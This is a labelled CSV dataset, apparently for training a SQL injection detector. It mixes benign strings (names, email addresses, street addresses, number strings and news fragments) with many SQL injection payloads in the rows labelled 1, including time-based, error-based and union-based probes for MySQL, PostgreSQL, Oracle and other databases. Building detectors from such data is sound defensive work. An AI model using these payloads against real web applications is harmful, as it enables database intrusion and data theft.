Sentence,Label
"1%' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( '%' = '",1
enenconcharse,0
"1 )  where 9059 = 9059 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1
"1""  )  )   as sdlv where 5922 = 5922 and 2006 = 2006",1
fanny,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1
"1%"" )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""%"" = """,1
"1"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""jozh"" = ""jozh",1
laflamme6,0
waitfor delay '0:0:5'#,1
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) # mafe",1
6162508820566713,0
1  )  )   as rcbz where 4563 = 4563 and 2006 = 2006,1
ashberry,0
1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and '%' = ',1
caravaca de la cruz,0
15552,0
"1%' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1%""  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
giuliani casabella,0
96815806c,0
"vallespir, 164,",0
6360914919102158,0
46688,0
"-7940%"" )  union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
5005,0
amarr1,0
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) -- saxs,1
levi,0
-3598 )  union all select 2264#,1
"1"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
de$lictivo,0
"1""  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( ""azmf"" = ""azmf",1
borio-radichev@lingote.com.gr,0
duda,0
rom.val@rpdkorea.eg,0
gonska@estaestuweb.com.af,0
 O &apos;Malley said new charge really raising money ,0
" Bags also seen covering transport facilities crash barriers , thus causing accidents ",0
82497790x,0
1542089007800249,0
edouard,0
kneeshaw,0
hatz,0
" select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
andratx,0
"-8021"" )  union all select 1166,1166,1166,1166--",1
" select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
gorse@16horas.yu,0
echecopar torrella,0
2876,0
-9668'  )  )   as orfu where 5822 = 5822 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
 What think Pammy &apos;s hair ? Share us thoughts comments ,0
"calle la paz, 88,",0
1'+ ( select 'mxlb' where 4900 = 4900,1
cen,0
brivio,0
selk@inversioneolica.ee,0
mcnear.trotta@lettere.ve,0
2j2st1,0
gaubert@clementelr.mw,0
"1' where 4272 = 4272 union all select null,null,null,null#",1
2821707836126747,0
gorfine,0
delfa,0
05190,0
"1%' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and '%' = '",1
03770036z,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
" The Ecumenical Discussion Forum initiative Catholic Protestant churches Salem , Salem Castle Lake Constance District Cultural Office ",0
select case when 2095 = 9074 then 1 else null end--,1
"1""  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""fuus"" like ""fuus",1
estolano boget,0
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur,1
antnimo,0
campoo de yuso,0
"1 )  as caoa where 6139 = 6139 union all select null,null,null,null,null,null,null,null--",1
"ondulada, 121",0
samalot,0
1%'  )  )   and sleep ( 5 ) #,1
zahnley,0
" 30 ideas debate , five made onto short list ",0
"1""  )  )   and sleep ( 5 )  and   (  (  ""lied"" like ""lied",1
98538229l,0
"calle capitan godoy beltran, 120",0
" The external likeness astounding: piercing eyes , beard , high forehead ",0
romina,0
3902,0
"montblanc 86, 12?d",0
rebolledo de la torre,0
neciamente,0
"jirafa, 165 7?g",0
6u2n8a,0
laicismo,0
59952544p,0
imogen1,0
-1890'  )  )   )  or 8526 = 1389 and   (  (   ( 'ecgt' = 'ecgt,1
"-6357"" )  order by 1--",1
aldea de san miguel,0
"gaspar mendez 173, 3-h",0
01r1f9co,0
1820,0
"1' )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
roldan,0
incr622to,0
congregation@saludyfitness.pm,0
86,0
lora del ro,0
" The virus selectively infects liver cells , start make steady stream antibodies ",0
1'  )  )   )  or sleep ( 5 ) #,1
aghili,0
baguda sabarich,0
-4215 )  where 5782 = 5782 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
narvate,0
1' in boolean mode )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) #,1
tobarra,0
hayman,0
"-6123"" or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""zuzx"" = ""zuzx",1
flateau@frioelectric.am,0
3318282529234021,0
1%' union all select null#,1
1' )  where 9817 = 9817,1
adelaide,0
"-4373%""  )  )   or 5672 = 5188--",1
48650,0
aguarn,0
23215,0
"c/ cala bona, 80,",0
canut escriba,0
1' )  as wpmv where 1479 = 1479 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
"make_set ( 5679 = 9769,9769 ) ",1
 A spokesman annual horse show said: &quot; Fenton three knows handle pony ,0
de cabezn raizbal,0
"-3781 )  union all select 3916,3916,3916--",1
"1  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  4348 = 4348",1
select  ( case when  ( 1726 = 4080 )  then 1726 else 1/ ( select 0 )  end ) --,1
"subida san diego 8, 13?c",0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'cxjp' = 'cxjp",1
hoeflich@movil-google.cx,0
23790,0
 Americans &apos;t buy much gas used ,0
88833808b,0
24249,0
" He advised parents boy whose penis severed botched circumcision child fully castrated , removing testicles , well , raise girl ",0
"1""  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  ""hmun"" = ""hmun",1
"c/ manacor, s/n,",0
63171354z,0
"1' where 5251 = 5251 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"c/ de los torneros, 5 2?c",0
"1"" )  where 9248 = 9248",1
"1' in boolean mode )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
03669,0
02124892z,0
"-1333""  )  )   union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",1
64115445r,0
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'dqjq' = 'dqjq",1
suba9tacin,0
4774034057366562,0
"1"" where 4597 = 4597 rlike sleep ( 5 ) --",1
milmarcos,0
4ode5ista,0
"1'+ ( select zpns where 6922 = 6922 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a  )  )  +'",1
calle capitan palacios 71,0
 The secret ham mix herbs combined salt ,0
" However , current economic crisis proved watershed ",0
-7962'  )  )   as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
de_salis,0
"c/ valdes salas, 39 11?c",0
"1%"" and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and ""%"" = """,1
sagers,0
3118403401340086,0
"1' )  where 6746 = 6746 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
cataquet ciavaglia,0
"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1
07995079a,0
arnaldo,0
"1' )  where 6081 = 6081 union all select null,null,null,null,null,null,null,null,null--",1
wicht,0
" Before citizen &apos;s initiative project , banner message &quot; We favour &quot; put ",0
50619,0
ailn,0
enedn,0
alegre nomdedeu,0
suzan,0
38408789p,0
gala,0
"1%""  )  )   or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1
"1  )  )   as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--",1
vilma,0
 ( 1589 = 1589 ) *1,1
 On happiness dreaming camels Happiness oasis dreaming camels manage reach It piece Bedouin wisdom first ever chairman Wolfgang Henne described history fascination behind &quot; Helping Hands &quot; society ,0
"1%"" )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( ""%"" = """,1
1'|| ( select 'hafu' where 6226 = 6226,1
space3,0
" When fire service arrived , flames already bursting window ",0
dannunzio.sugiura@ilusionarium.sj,0
"1' )  as bfgl where 8959 = 8959 union all select null,null,null,null,null,null,null,null,null,null--",1
"1' where 2391 = 2391 union all select null,null,null,null,null,null,null,null,null,null--",1
car7gordo,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  ""eevk"" = ""eevk",1
"-2725"" union all select 3671,3671,3671,3671,3671#",1
06894,0
prussel@mataluenga.co,0
"1""  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""epwi"" like ""epwi",1
ann-margaret@indorec.pro,0
overton,0
" He also admitted beating raping , however denied responsible death girl ",0
santa cruz de la salceda,0
"plaza fontana, 78,",0
rev8nir,0
8457,0
"1"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""jcgh"" = ""jcgh",1
 Rainer Schulze expert comes Cologne underworld ,0
!7ons6je6am4n2e,0
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and 'swke' = 'swke",1
alexio,0
aminta,0
"1%"" or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1"" )  where 6311 = 6311",1
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  # irvm",1
roobbie,0
6905166660575167,0
"1""  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""bfko"" = ""bfko",1
" &quot; Frontier also following Spirit &apos;s $ 2 charge coffee , tea , soda , juice ",0
almeida de sayago,0
password:*/ = 1--,1
mario caraball,0
alcantud,0
" Sales Silverado Sierra trucks , redesigned 2014 model year , 20 percent first 10 months year , GM said Friday ",0
5092047047326643,0
"calle barrio cura-vigo vello, 134 10?d",0
obed9e3cia0,0
"select * from generate_series ( 3551,3551,case when  ( 3551 = 6451 )  then 1 else 0 end )  limit 1--",1
moston@sierradealcaraz.sg,0
", 2006; Favre et al",0
31270,0
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
4248,0
"1%'  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  '%' = '",1
sol,0
2161o1o,0
jaramillo quemado,0
margheri,0
1u1tro,0
10650,0
1'  )  )   )  and 8162 = 1687 and   (  (   ( 'tdyr' like 'tdyr,1
"1"" )  where 4822 = 4822 union all select null,null,null,null,null,null,null,null,null,null--",1
" Additionally , Defender Challenge provide training test day February , well option compete desert events North Africa Middle East ",0
"1%"" )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'opyp' = 'opyp,1
" select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
13420,0
"1  )  )   as cvid where 4381 = 4381 union all select null,null--",1
walley@santacruzdelvoto.gg,0
"c/ san lorenzo, 171",0
or5i6or6i686,0
47330,0
sau nobrega,0
chodos/xodos,0
3096,0
1365,0
byron@vinavilano.gl,0
lubna,0
macrura,0
93398116s,0
"1%' )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
1'|| ( select 'miew' where 8360 = 8360 waitfor delay '0:0:5' ) ||',1
mel,0
28812,0
hiss@ajuntamentdebarcelona20.yu,0
"1 )  union all select null,null,null,null,null,null--",1
hanlon@importaproductosespaoles.cs,0
terry@mtos.ar,0
dotras avi,0
-5982' or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and 'ikuh' = 'ikuh,1
14859,0
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) ",1
" &quot; Finally ! &apos; , raved Mayor Steinar Bergsland inaugural ceremony , televised broadcaster TV2 ",0
7272917416802626,0
ruttmann@quadernideilgarda.dz,0
"1 and make_set ( 8403 = 8403,8899 ) ",1
38370,0
voglis@hiperxxx.au,0
castelln,0
ellul0,0
calle dos reis 49,0
"1%' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( '%' = '",1
bolkan@directoriogratuito.int,0
"c/ juan ramon jimenez, 135, 11d",0
"ruiz de alda, 78",0
4811716935763521,0
acebes matiz,0
sidonia,0
repinarse,0
1026055264847672,0
" However , repertoire also includes emotive waltzes full big band sound ",0
" select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1
1er87n30689,0
1'|| ( select 'yhpe' where 8010 = 8010 rlike  ( select  ( case when  ( 7910 = 3752 )  then 1 else 0x28 end  )  )   ) ||',1
0936495801431480,0
"1%"" )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
"1%"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,1
pereda barrio,0
"-4230""  )  )   )  union all select 6962,6962,6962,6962,6962,6962#",1
1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'mqoj' like 'mqoj,1
27047841w,0
"-6770'  )  )   union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",1
2308,0
"1'+ ( select 'yzxc' where 5230 = 5230  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )    )  )  +'",1
select  ( case when  ( 2576 = 7563 )  then 2576 else 1/ ( select 0 )  end ) --,1
 select * from users where id = '1'<@.. or 1 = 1 -- 1',1
"1'+ ( select 'ples' where 4244 = 4244 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  +'",1
" &quot; The law gives parents space rush making decisions , &quot; said Baratz ",0
fiodorov@contactomujeres.kr,0
"1"" where 3990 = 3990 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
1  )  )   )  and 4595 = 4595#,1
6676519616771498,0
" Similarly UK , Flight Centre &apos;s leisure business performed well corporate clients spending less ",0
59bi8ari7o,0
"waitfor delay '0:0:5' and   (  (   ( ""%"" = """,1
esser,0
monsalve almada,0
 There hardly squad changes winter transfer window ,0
angeles jarama,0
timms,0
17,0
49339665l,0
"1"" where 9341 = 9341",1
26329,0
06310,0
"1' )  as ghks where 5128 = 5128 union all select null,null,null,null,null,null,null,null,null,null#",1
"1 )  union all select null,null,null,null--",1
gallenbe7,0
"1'  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  'ayqn' like 'ayqn",1
5128322398230292,0
4761952395684285,0
curul,0
aguadulce,0
48426953q,0
8954375699794509,0
atl-sale,0
" Police women &apos;s associations South Africa , however , estimate number unreported cases sexual assault 10-25 times high ",0
" As pastoral workers , ministers close people ",0
"1%'  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( '%' = '",1
"-6407' )  or elt ( 1631 = 4946,4946 )  and  ( 'jpnz' = 'jpnz",1
"1' )  where 6248 = 6248 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
rahue,0
de la poza sansabria,0
6vencea,0
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""xyjg"" = ""xyjg",1
yong-gomori@andrestabernero.gg,0
narros de matalayegua,0
glido,0
docken.carmi@soyrojo.so,0
"1"" where 1100 = 1100",1
"1 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
2962225495583197,0
"1'+ ( select vupb where 9575 = 9575 union all select null,null,null,null,null,null,null,null,null,null--",1
serrtil,0
"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1
2el6s,0
1931146667216173,0
08230,0
vree@eddydaniele.tm,0
prspera,0
"avinguda castellot, 116,",0
